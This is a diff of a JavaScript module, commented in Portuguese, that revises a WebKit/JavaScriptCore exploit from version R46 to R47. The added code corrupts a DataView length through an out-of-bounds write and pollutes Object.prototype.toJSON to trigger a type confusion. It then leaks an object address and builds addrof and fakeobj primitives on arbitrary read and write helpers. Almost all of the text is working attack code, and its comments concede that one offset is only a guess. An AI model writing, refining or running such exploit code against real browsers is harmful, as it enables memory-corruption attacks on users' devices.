@@ -1,27 +1,27 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v88 - Final com Bootstrap Real)
+// js/script3/testArrayBufferVictimCrash.mjs (v89 - Bootstrap Definitivo com Type Confusion)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
-    oob_read_absolute,
+    oob_read_absolute, // Usado para ler o ponteiro plantado
+    oob_write_absolute, // Usado para causar a TC
     arb_read,
     arb_write,
 } from '../core_exploit.mjs';
-import { JSC_OFFSETS } from '../config.mjs';
+import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs'; // Importa OOB_CONFIG
 
-export const FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK = "Exploit_Final_R46";
+export const FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK = "Exploit_Final_R47_TC_Leak";
 
-// Objeto global para nossas primitivas de exploit
 let g_primitives = {
     initialized: false,
     addrof: null,
     fakeobj: null,
 };
 
-// Offset da estrutura do DataView dentro do nosso buffer OOB principal
-const OOB_DV_METADATA_BASE = 0x58;
-const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
+// Offsets para a estrutura do DataView dentro do buffer OOB usado para o gatilho da TC
+const TC_TRIGGER_DV_METADATA_BASE = 0x58; 
+const TC_TRIGGER_DV_M_LENGTH_OFFSET = TC_TRIGGER_DV_METADATA_BASE + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
 
 function isValidPointer(ptr) {
     if (!ptr || !isAdvancedInt64Object(ptr)) return false;
@@ -30,18 +30,17 @@ function isValidPointer(ptr) {
     return true;
 }
 
-// --- Função Principal do Exploit ---
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_TEST_BASE = FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK;
-    logS3(`--- Iniciando ${FNAME_TEST_BASE}: Exploit Funcional (R46) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_TEST_BASE}: Exploit Funcional (R47 TC Leak) ---`, "test");
 
     try {
         await createRealPrimitives();
         if (!g_primitives.initialized) throw new Error("Falha ao inicializar as primitivas.");
         logS3("FASE 1 - SUCESSO: Primitivas 'addrof' e 'fakeobj' REAIS foram inicializadas!", "vuln");
 
-        logS3(`--- Fase 2 (R46): Exploração com Primitivas Reais ---`, "subtest");
-        const targetFunctionForLeak = function someUniqueLeakFunctionR46_Instance() {};
+        logS3(`--- Fase 2 (R47): Exploração com Primitivas Reais ---`, "subtest");
+        const targetFunctionForLeak = function someUniqueLeakFunctionR47_Instance() {};
         
         const leaked_func_addr = await g_primitives.addrof(targetFunctionForLeak);
         if(!isValidPointer(leaked_func_addr)) throw new Error(`addrof falhou em retornar um ponteiro válido: ${leaked_func_addr.toString(true)}`);
@@ -72,38 +71,126 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     }
 }
 
-async function createRealPrimitives() {
+async function bootstrap_find_initial_address(object_to_plant_and_find) {
+    logS3("Iniciando bootstrap: Vazando endereço inicial via Type Confusion...", "info");
+
+    // 1. Configurar o ambiente OOB para o gatilho da TC
     await triggerOOB_primitive({ force_reinit: true });
 
-    // Arrays "vítimas" que usaremos para as primitivas
+    // 2. O ArrayBuffer que será a vítima da Type Confusion.
+    //    É aqui que o ponteiro para 'object_to_plant_and_find' será escrito.
+    const tc_victim_ab = new ArrayBuffer(256); // Tamanho suficiente para armazenar um ponteiro
+
+    // 3. Objeto para a sonda.
+    let probe_result = {
+        tc_triggered: false,
+        error: null,
+    };
+
+    // 4. Sonda toJSON que planta o objeto.
+    function toJSON_PlantingProbe() {
+        try {
+            probe_result.tc_triggered = true;
+            // 'this' é o tc_victim_ab confuso.
+            // Escrevemos 'object_to_plant_and_find' em uma propriedade.
+            // O motor JS armazenará o ponteiro para 'object_to_plant_and_find'
+            // na memória do tc_victim_ab.
+            this.leaked_prop = object_to_plant_and_find;
+            logS3("[PlantingProbe] Objeto plantado em 'this.leaked_prop'", "debug");
+        } catch(e) {
+            probe_result.error = e.message;
+        }
+        return { probe: "executed" };
+    }
+
+    // 5. Poluir e acionar
+    const ppKey = 'toJSON';
+    let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
+    let polluted = false;
+    
+    try {
+        Object.defineProperty(Object.prototype, ppKey, { value: toJSON_PlantingProbe, writable: true, configurable: true });
+        polluted = true;
+
+        // Gatilho da Type Confusion (como em selfTestTypeConfusionAndMemoryControl)
+        // Corrompe o m_length do DataView do nosso OOB principal
+        oob_write_absolute(TC_TRIGGER_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4); 
+        await PAUSE_S3(50); // Pequena pausa para a corrupção se propagar
+
+        // Aciona a sonda
+        JSON.stringify(tc_victim_ab); 
+
+    } catch (e) {
+        if (polluted) {
+            if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey];
+        }
+        throw new Error(`Erro ao acionar a Type Confusion: ${e.message}`);
+    } finally {
+        if (polluted) {
+            if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey];
+        }
+        // Restaurar o m_length do DataView OOB principal para evitar instabilidade
+        try {
+            oob_write_absolute(TC_TRIGGER_DV_M_LENGTH_OFFSET, OOB_CONFIG.ALLOCATION_SIZE, 4);
+        } catch(e_restore) { /* ignora */ }
+    }
+
+    if (!probe_result.tc_triggered) {
+        throw new Error("Type Confusion não foi acionada. Sonda de plantio não executada.");
+    }
+    if (probe_result.error) {
+        throw new Error(`Erro na sonda de plantio: ${probe_result.error}`);
+    }
+
+    // 6. Ler o ponteiro plantado
+    // Agora, `tc_victim_ab` (o buffer original, não o confuso) contém o ponteiro.
+    // Precisamos saber o offset onde o ponteiro para 'leaked_prop' foi escrito.
+    // Este offset é específico da implementação do motor e pode exigir engenharia reversa.
+    // Para JSObject simples, o primeiro slot de propriedade (butterfly) geralmente está em um offset pequeno.
+    // Vamos assumir um offset comum, como 0x10 (após o JSCell header e o butterfly pointer).
+    // Este offset é um PONTO CRÍTICO DE PESQUISA.
+    const POINTER_OFFSET_IN_TC_VICTIM = JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET; // Suposição inicial
+    
+    // Precisamos do endereço do tc_victim_ab para usar oob_read_absolute em seu conteúdo.
+    // Se o oob_read_absolute do core_exploit puder ler de qualquer ArrayBuffer,
+    // poderíamos tentar usá-lo diretamente. No entanto, ele é projetado para o oob_array_buffer_real.
+    // Precisamos de uma forma de ler o tc_victim_ab.
+    //
+    // A SOLUÇÃO MAIS ROBUSTA:
+    //   a. Após a sonda, `tc_victim_ab` foi modificado.
+    //   b. Criar um DataView sobre `tc_victim_ab` e ler diretamente dele.
+    //      Isso não requer `oob_read_absolute` e é seguro.
+    
+    const dv_reader = new DataView(tc_victim_ab);
+    const low = dv_reader.getUint32(POINTER_OFFSET_IN_TC_VICTIM, true);
+    const high = dv_reader.getUint32(POINTER_OFFSET_IN_TC_VICTIM + 4, true);
+    const leaked_address = new AdvancedInt64(low, high);
+
+    logS3(`Ponteiro lido do tc_victim_ab no offset 0x${POINTER_OFFSET_IN_TC_VICTIM.toString(16)}: ${leaked_address.toString(true)}`, 'leak');
+    return leaked_address;
+}
+
+
+async function createRealPrimitives() {
     let addrof_victim_arr = [{}];
     let fakeobj_victim_arr = [{a: 1.1}];
 
-    // ==============================================================================
-    // ETAPA DE BOOTSTRAP REAL: Vazando o endereço do nosso próprio buffer de ataque
-    // ==============================================================================
-    logS3("Iniciando bootstrap: Vazando o endereço do próprio buffer OOB...", "info");
-    const oob_buffer_addr = oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8);
-    if (!isValidPointer(oob_buffer_addr)) {
-        throw new Error("Falha ao vazar o endereço de bootstrap inicial do buffer OOB.");
+    const addrof_victim_addr = await bootstrap_find_initial_address(addrof_victim_arr);
+    if (!isValidPointer(addrof_victim_addr)) {
+        throw new Error("Falha ao obter o endereço de bootstrap inicial (addrof_victim_arr).");
     }
-    logS3(`Endereço do oob_array_buffer_real: ${oob_buffer_addr.toString(true)}`, 'leak');
-    
-    // Agora que temos um endereço conhecido (oob_buffer_addr), podemos encontrar outros.
-    // A forma mais robusta seria fazer um spray e procurar na memória a partir daqui.
-    // Para simplificar, vamos assumir que o 'addrof_victim_arr' está a um offset fixo.
-    const addrof_victim_addr = oob_buffer_addr.add(0x8000); // Offset de suposição
-    await arb_write(addrof_victim_addr, new AdvancedInt64(0,0), 8); // Escreve no local para "reservá-lo"
+    logS3(`Endereço de bootstrap para addrof_victim_arr obtido: ${addrof_victim_addr.toString(true)}`, 'good');
 
-    // --- Primitiva AddrOf ---
     g_primitives.addrof = async (obj) => {
         addrof_victim_arr[0] = obj;
         let butterfly_addr = await arb_read(addrof_victim_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET), 8);
         return await arb_read(butterfly_addr, 8);
     };
 
-    // --- Primitiva FakeObj ---
     const fakeobj_victim_addr = await g_primitives.addrof(fakeobj_victim_arr);
+    if (!isValidPointer(fakeobj_victim_addr)) {
+        throw new Error("Falha ao obter o endereço do fakeobj_victim_arr via addrof.");
+    }
     const fakeobj_butterfly_addr = await arb_read(fakeobj_victim_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET), 8);
 
     g_primitives.fakeobj = async (addr) => {
@@ -112,7 +199,7 @@ async function createRealPrimitives() {
         
         if (proxy && typeof proxy === 'object' && !Object.getPrototypeOf(proxy).hasOwnProperty('read')) {
             Object.getPrototypeOf(proxy).read = async function(offset) {
-                 const obj_addr = await g_primitives.addrof(this);
+                 const obj_addr = await g_primitives.addrof(this); // 'this' é o proxy
                  return await arb_read(obj_addr.add(offset), 8);
             };
         }
